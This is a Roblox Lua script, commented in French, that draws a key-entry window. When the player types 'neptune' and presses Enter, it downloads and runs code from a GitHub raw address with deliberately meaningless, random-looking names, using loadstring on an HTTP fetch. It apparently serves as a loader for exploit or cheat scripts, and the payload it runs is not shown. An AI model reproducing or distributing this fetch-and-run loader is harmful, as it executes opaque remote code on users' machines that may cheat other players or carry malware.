-- Création du GUI
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

local frame = Instance.new("Frame")
frame.Parent = gui
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Fond noir
frame.BorderSizePixel = 2

local textLabel = Instance.new("TextLabel")
textLabel.Parent = frame
textLabel.Size = UDim2.new(1, 0, 0.2, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Mettez la clé:"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20

local textbox = Instance.new("TextBox")
textbox.Parent = frame
textbox.Size = UDim2.new(0.8, 0, 0.2, 0)
textbox.Position = UDim2.new(0.1, 0, 0.3, 0)
textbox.PlaceholderText = "metter la clé ici"
textbox.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Gris clair
textbox.BorderSizePixel = 0
textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
textbox.TextSize = 18

local button = Instance.new("TextButton")
button.Parent = frame
button.Size = UDim2.new(0.3, 0, 0.15, 0)
button.Position = UDim2.new(0.35, 0, 0.7, 0)
button.Text = "Fermer"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- Rouge foncé
button.BorderSizePixel = 2
button.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- Fonction pour charger le script si le texte est "neptune" et fermer le GUI
local function loadNeptuneScript()
    local userInput = textbox.Text:lower()
    if userInput == "neptune" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/234t243yt24yt24ty245a123rwerg/15626245625t24hy42hy524y5/main/2g08ty13y4g871t0g48013t013tg13g87t13t153y"))()
        gui:Destroy() -- Ferme le GUI si "neptune" est entré
    end
end

-- Fonction pour gérer l'événement d'appui sur la touche Entrée
local function onEnterPressed(input)
    if input.KeyCode == Enum.KeyCode.Return then
        loadNeptuneScript() -- Vérifie si le texte est "neptune" et charge le script
    end
end

-- Connecter la fonction à l'événement "InputBegan" du joueur
game:GetService("UserInputService").InputBegan:Connect(onEnterPressed)
